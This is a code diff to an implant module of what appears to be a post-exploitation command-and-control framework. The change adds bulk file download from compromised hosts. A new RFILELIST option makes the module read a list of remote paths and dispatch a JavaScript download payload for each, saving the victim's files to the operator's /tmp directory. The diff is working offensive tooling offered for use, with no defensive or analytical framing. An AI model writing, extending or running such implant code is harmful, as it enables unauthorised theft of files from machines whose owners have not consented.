@@ -12,15 +12,28 @@ class DownloadFileImplant(core.implant.Implant):
 
     def load(self):
         self.options.register("LPATH", "/tmp/", "local file save path")
-        self.options.register("RFILE", "", "remote file to get")
+        self.options.register("RFILE", "", "remote file to get", required=False)
+        self.options.register("RFILELIST", "", "file containing line-seperated file names to download", required=False)
 
     def run(self):
-        self.options.set("RFILE", self.options.get('RFILE').replace("\\", "\\\\").replace('"', '\\"'))
+        rfile = self.options.get("RFILE")
+        rfilelist = self.options.get("RFILELIST")
+        if not rfile and not rfilelist:
+            self.shell.print_error("Need to define either RFILE or RFILELIST")
+            return
 
         payloads = {}
-        payloads["js"] = self.loader.load_script("data/implant/util/download_file.js", self.options)
-
-        self.dispatch(payloads, DownloadFileJob)
+        if rfilelist:
+            file = open(rfilelist, 'r')
+            files = file.read().splitlines()
+            for f in files:
+                self.options.set("RFILE", f.replace("\\", "\\\\").replace('"', '\\"'))
+                payloads["js"] = self.loader.load_script("data/implant/util/download_file.js", self.options)
+                self.dispatch(payloads, DownloadFileJob)
+        else:
+            self.options.set("RFILE", self.options.get('RFILE').replace("\\", "\\\\").replace('"', '\\"'))
+            payloads["js"] = self.loader.load_script("data/implant/util/download_file.js", self.options)
+            self.dispatch(payloads, DownloadFileJob)
 
 class DownloadFileJob(core.job.Job):
     def report(self, handler, data, sanitize = False):
